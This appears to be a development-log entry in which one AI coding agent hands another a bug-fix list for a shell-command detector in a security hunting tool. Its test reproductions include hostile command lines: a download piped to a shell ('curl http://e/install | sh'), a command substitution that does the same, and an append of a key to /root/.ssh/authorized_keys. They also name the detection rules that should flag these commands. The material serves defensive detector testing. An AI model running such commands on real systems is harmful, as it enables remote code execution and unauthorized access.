
---

## 2026-10-18 · Claude → Codex: GATE RE-RUN FIX ROUND. Execute only; no planning step.

**Gate re-run results (independent reviewers, reproduced by probe):**
- **Investigator: PASS WITH ISSUES.** Your B1, B2 and B3 are fixed, including the two-worker interleave and migration `0003` on an existing DB.
- **Core: FAIL.** B1–B6 and I11 are fixed. B7 is only partly fixed, and there are two new Blocking items.
- Claude already fixed core N3 (sequence-pair raw copies lost across partitions) in `b332dac`. 211 tests pass.

**Implement the items below now, test-first, one commit per item, in this order. Do not write a plan, design or approval request first.** Items 1–2 are Blocking; 3–5 are small follow-ups.

### 1 (core N1, Blocking): the tokenizer still treats shell data as commands
`src/romulus/evidence/shellparse.py`: backslash-escaped punctuation isn't protected, `#` comments are parsed as code, and the newline-as-separator change from `6b4d2b1` turned heredoc bodies into commands, a regression. Reproductions (each currently produces a false finding):
- `bash -c 'cat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF'` → urgent `host.download_piped_to_shell`
- the same heredoc with `echo key >> /root/.ssh/authorized_keys` in the body → high `host.ssh_authorized_keys_write`
- `echo usage: \; curl http://e/i \| sh` → urgent
- `apt-get update # then; curl http://e | sh` → urgent

**Done when:** escaped punctuation is literal; `#` at the start of an unquoted word comments to end of line; heredocs (`<<`, `<<-`) are either skipped correctly up to their delimiter or make the parse `ok=False`. Each reproduction above is a fixture that produces no match.

### 2 (core N2, Blocking): a failed or unmodelled parse produces a complete negative
`src/romulus/detect/host.py`: `DownloadPipedToShell` and `AuthorizedKeysWrite` return `[]` when `parsed.ok` is False, and nothing marks the record unevaluable, so the cell becomes `no_match_complete`. Command substitution (`$(...)`, backticks) is executed by bash but never evaluated. Reproductions:
- `bash -c "curl http://e/x | sh; echo $'it\'s'"` (shlex can't parse it) → `no_match_complete`
- `bash -c 'x=$(curl http://e/x | sh)'` → `no_match_complete`

**Done when:** every shell-script rule counts scripts that can't be parsed, or that contain command substitution or heredocs, as unevaluable through a playbook counter, so the cell becomes `evaluated_partial` (the sweep already treats `missing_required` that way; reuse it or add an equivalent counter). Fault-injection fixtures cover both reproductions.

### 3 (investigator N1, Important): pivot data-plane writes aren't fenced
`src/romulus/hunt/pivot.py` task, evidence and candidate writes go through `repo.upsert_task`, `update_task`, `save_evidence` and `save_candidate` with no owner token. A worker displaced between heartbeats can still write evidence and publish a candidate after the new owner finishes.

**Done when:** `owner_token` is passed through `PivotExecutor` and `publish_match` into those writes and fenced inside the same transaction, and a test displaces a worker during normalization and proves no write lands.

### 4 (investigator N2, Minor): `resume_hunt` doesn't guard contract preflight failures
`src/romulus/hunt/run.py`. **Done when:** a preflight failure during resume sets a terminal or partial state with the owner token, like `run_hunt` does, and has a test.

### 5 (investigator N3, Minor): `ids_alerts` still advertises host entities
`src/romulus/agent/tools.py`. **Done when:** the catalog and validator accept only `ip` entities for `ids_alerts`.

### Rules
Same as before:
- Don't change decision-policy lanes or the read-only allowlist.
- Don't undo `7d019b9`, `2663e1d` or `b332dac`.
- Never read `/home/user/romulus-eval/` or touch v1.
- Only stop for owner-only needs or a §1 conflict with no safe option.

### Verify, then hand back
- Run the full suite and the archmap check.
- Deploy from PowerShell with `scripts/deploy.ps1 -SkipInstall` and confirm the printed commit matches `HEAD`.
- Run one model-off lab hunt over 2024-11-18T10:00Z–17:30Z. Expect `completed_within_scope`, 0 normalization errors, 0 broken citations, and the same 7 urgent / 11 high finding counts unless a fix legitimately changes them; if they change, explain which finding and why.
- Append `Gate re-run fix results` below with commits, exact commands and real output tails.
- Then stop. Claude will re-run the core gate.
